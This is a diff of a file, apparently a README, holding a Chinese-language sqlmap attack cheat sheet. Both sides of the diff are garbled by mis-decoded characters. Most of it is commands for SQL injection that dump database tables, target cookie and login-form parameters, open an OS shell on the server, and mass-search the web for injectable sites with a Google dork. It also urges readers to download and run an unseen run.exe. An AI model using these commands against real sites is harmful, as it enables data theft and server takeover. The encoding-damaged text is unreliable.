@@ -1,89 +1,89 @@
-ÔÚÎÒµÄ×Ô¼ºµÄ·şÎñÆ÷ÉÏ£¨http://45.63.4.90/£©²âÊÔ¹ıÕâ¸ö½Å±¾¿ÉÒÔÔËĞĞ£¬Í¨¹ı¹¤¾ß³É¹¦»ñÈ¡ÁËĞÅÏ¢£¬¹ş¹ş
-
-ÔËĞĞ·½·¨ Ê¹ÓÃrun.exe¾Í¿ÉÒÔ¿©£¬È»ºóÇÃÉÏ¹¥»÷ÃüÁî¾Í¸ã¶¨ÁË£¬¹ş¹ş~
-
-
-
-access×¢ÈëÊÖ·¨
-
-
-1.ÊäÈëurl
-
-2.url --tables ²Â±í
-
-3 url--columns -T ±íÃû     ±©×Ö¶Î
-
-4.url --dump -T ±íÃû -C "×Ö¶ÎÃû"  ±©ÄÚÈİ
+åœ¨æˆ‘çš„è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼ˆhttp://45.63.4.90/ï¼‰æµ‹è¯•è¿‡è¿™ä¸ªè„šæœ¬å¯ä»¥è¿è¡Œï¼Œé€šè¿‡å·¥å…·æˆåŠŸè·å–äº†ä¿¡æ¯ï¼Œå“ˆå“ˆ
+å…ˆä»githubä¸‹è½½æˆ‘çš„ç¨‹åºï¼Œç„¶åè§£å‹ç¼©
+è¿è¡Œæ–¹æ³• ä½¿ç”¨run.exeå°±å¯ä»¥å’¯ï¼Œç„¶åæ•²ä¸Šæ”»å‡»å‘½ä»¤å°±æå®šäº†ï¼Œå“ˆå“ˆ~
 
 
 
+accessæ³¨å…¥æ‰‹æ³•
 
 
-mysql×¢ÈëÊÖ·¨
+1.è¾“å…¥url
 
-url --current-dbµ±Ç°¿â
-url --current-userµ±Ç°ÓÃ»§
+2.url --tables çŒœè¡¨
 
-url --dbs     »ñµÃÊı¾İ¿â
+3 url--columns -T è¡¨å     æš´å­—æ®µ
 
-url -D Êı¾İ¿â --tables »ñµÃ±í
-
-url -D Êı¾İ¿â -T ±íÃû --columns ±©×Ö¶Î
-
-url -D Êı¾İ¿â -T ±íÃû -C ×Ö¶Î --dump   ±©ÄÚÈİ
+4.url --dump -T è¡¨å -C "å­—æ®µå"  æš´å†…å®¹
 
 
 
 
-cookie×¢Èë
 
-url --cookie "id=" --table --level 2    ±©±í
+mysqlæ³¨å…¥æ‰‹æ³•
 
-url --cookie "id=" --columns -T ±íÃû --level 2 »ñµÃ×Ö¶Î
+url --current-dbå½“å‰åº“
+url --current-userå½“å‰ç”¨æˆ·
 
-url --cookie "id=" --dump -T ±íÃû -C "×Ö¶ÎÃû" --level 2  »ñµÃÄÚÈİ
+url --dbs     è·å¾—æ•°æ®åº“
 
+url -D æ•°æ®åº“ --tables è·å¾—è¡¨
 
+url -D æ•°æ®åº“ -T è¡¨å --columns æš´å­—æ®µ
 
-postµÇÂ½¿ò×¢Èë
-
-·½·¨Ò»:ÀûÓÃburp Suit×¥°ü£¬°Ñ°üÄÚÈİ±£´æÎªtxt
-sqlmap -r ±£´æµÄ°üÎÄ±¾ -p  ²ÎÊı
-
-·½·¨¶ş:sqlmap -u url --forms
-
-·½·¨Èı:sqlmap -u url --data "²ÎÊı=Öµ&²ÎÊı=Öµ"
+url -D æ•°æ®åº“ -T è¡¨å -C å­—æ®µ --dump   æš´å†…å®¹
 
 
 
 
-Ğ´Èësehll(È¨ÏŞ´óÊ±²Å¿ÉÒÔ)
+cookieæ³¨å…¥
 
-sqlmap - u url --os -cmd=ÃüÁî
-sqlmap - u url --os -shell=ÃüÁî
+url --cookie "id=" --table --level 2    æš´è¡¨
 
+url --cookie "id=" --columns -T è¡¨å --level 2 è·å¾—å­—æ®µ
 
-Î±¾²Ì¬×¢Èë
-
-ÔÚ´æÔÚ×¢ÈëµÄµØ·½¼ÓÉÏ*ºÅ
-
-
-ÑÓÊ±×¢Èë
-
-sqlmap - dbs -u url --delay ºóÃæ¸úÃë
-
-sqlmap --dbs -u url --safe-freq ´ÎÊı
+url --cookie "id=" --dump -T è¡¨å -C "å­—æ®µå" --level 2  è·å¾—å†…å®¹
 
 
 
+postç™»é™†æ¡†æ³¨å…¥
 
-ÅúÀíËÑË÷
+æ–¹æ³•ä¸€:åˆ©ç”¨burp SuitæŠ“åŒ…ï¼ŒæŠŠåŒ…å†…å®¹ä¿å­˜ä¸ºtxt
+sqlmap -r ä¿å­˜çš„åŒ…æ–‡æœ¬ -p  å‚æ•°
+
+æ–¹æ³•äºŒ:sqlmap -u url --forms
+
+æ–¹æ³•ä¸‰:sqlmap -u url --data "å‚æ•°=å€¼&å‚æ•°=å€¼"
+
+
+
+
+å†™å…¥sehll(æƒé™å¤§æ—¶æ‰å¯ä»¥)
+
+sqlmap - u url --os -cmd=å‘½ä»¤
+sqlmap - u url --os -shell=å‘½ä»¤
+
+
+ä¼ªé™æ€æ³¨å…¥
+
+åœ¨å­˜åœ¨æ³¨å…¥çš„åœ°æ–¹åŠ ä¸Š*å·
+
+
+å»¶æ—¶æ³¨å…¥
+
+sqlmap - dbs -u url --delay åé¢è·Ÿç§’
+
+sqlmap --dbs -u url --safe-freq æ¬¡æ•°
+
+
+
+
+æ‰¹ç†æœç´¢
 
 
 sqlmap -g inurl:php?id=
 
 
-url --privileges²é¿´È¨ÏŞ
+url --privilegesæŸ¥çœ‹æƒé™
 
 
 
